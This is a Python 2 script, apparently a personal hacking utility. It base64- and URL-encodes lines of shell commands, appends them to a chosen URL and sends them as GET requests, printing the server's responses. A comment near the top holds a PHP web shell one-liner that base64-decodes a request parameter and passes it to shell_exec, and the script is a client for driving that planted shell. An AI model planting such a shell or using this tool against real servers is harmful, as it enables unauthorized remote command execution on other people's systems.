#!/usr/bin/python2

import sys, urllib, base64
import requests

##Procedural slop and I know it... but gets 'er done
## LOL
## '<?php "$a" = base64_decode($_GET["a"]); echo "$a", shell_exec("$a"); ?>'


encORdec="0"      ##not yet implemented option decode
baseURL=""
line=""
is_base64ENC="0"
is_base64DEC="0"  ##not yet implemented
is_URLencode="0"
is_URLdecode="0"  ##not yet implemented
is_baseURL="0"
do_debugPrintLine = "0"

while encORdec != "1" and encORdec != "2":
    encORdec=raw_input("Encode or decode?:\n[1] Encode\n[2] Decode\n")
    if encORdec == "1":
        is_base64ENC=1
        # then might have to URL encode, and there might be a base URL.
        while is_URLencode != "1" and is_URLencode != "2":
            is_URLencode=raw_input("URLencode the b64?:\n[1] yes\n[2] no\n")
        while is_baseURL != "1" and is_baseURL != "2":
            is_baseURL=raw_input("Is there a base URL to put the encode onto?\n[1] Yes\n[2] No\n")
        if is_baseURL == "1":
            baseURL = raw_input("Give me the base URL:\n").rstrip()
    if encORdec == "2":
        ## Not yet implemented, asshat!
        print("._._.\n[x!x]\nVVVV\n^^^^\nNot yet implemented, asshat!")
        sys.exit() ## because Not yet implemented, asshat!
    while do_debugPrintLine != "1" and do_debugPrintLine != "2":
        do_debugPrintLine=raw_input("Print decoded lines with output?:\n[1] Yes\n[2] No\n")

while line != "exit":
    list=[]
    line=""
    userin="0"
    req=[]
    resp=[]
    print("\n[!!] Give heredoc.  End heredoc input with \"EOF\".  Quit with \"exit\".:")
    while line != "EOF" and line != "exit":
        line=raw_input("")
        if line != "EOF":
            list.append(line)
    for item in list:
        str=""
        pre=item
        curr=""
        post=""
        if encORdec == "1":
            str=base64.b64encode(item)
            curr=str
            if is_URLencode == "1":
                tmp=str
                str=urllib.quote_plus(tmp)
                curr=str
            if do_debugPrintLine == "1":
                if is_URLencode == "1":
                    post=base64.b64decode(urllib.unquote_plus(str))
                else:
                    post=base64.b64decode(str)
            if is_baseURL == "1":
                tmp=str
                str=baseURL + tmp
                # if encORdec == "2":
        req.append(str)
        print(str)
        if do_debugPrintLine == "1":
            print("\tpre: " + pre)
            print("\tenc: " + curr)
            print("\tdec: " + post)
    if is_baseURL == '1':
        userin=raw_input("GET request the URLs?:\n[1] Yes\n[2] No\n")
    if userin == "1":
        for item in req:
            print(item)
            headers = {'Accept-Encoding': 'identity'}
            r=requests.get(item)
            resp.append(r.text)
            # print("\tStatus code = " + str(r.status_code))
            print "\t", r.status_code
        userin = raw_input("Print the returned source code responses to GET requests sent?:\n[1] Yes\n[2] No\n")
        if userin == "1":
            for i in range(len(resp)):
                print("\n\n\n\n\n\n")
                print(req[i])
                usin=raw_input("Print the response to this request?\n[1] Yes\n[2] No\n")
                if usin == "1":
                    print(resp[i])


sys.exit()


